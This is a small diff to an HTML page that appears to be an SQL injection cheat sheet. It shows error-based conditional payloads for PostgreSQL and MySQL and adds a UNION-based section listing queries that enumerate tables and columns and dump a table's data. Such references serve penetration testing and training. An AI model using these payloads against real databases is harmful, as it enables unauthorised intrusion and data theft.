@@ -39,3 +39,9 @@
 <p><b>PostgreSQL:</b>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END</p>
 <p><b>MySQL:</b>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</p>
 
+<h2>UNION BASED</h2>
+<p>order by </p>
+<p>union select</p>
+<p>group_concat(table_name) from information_schema.tables where table_schema=database()</p>
+<p>group_concat(column_name) from information_schema.columns where table_name='table_name'</p>
+<p>group_concat(data) from table_name</p>
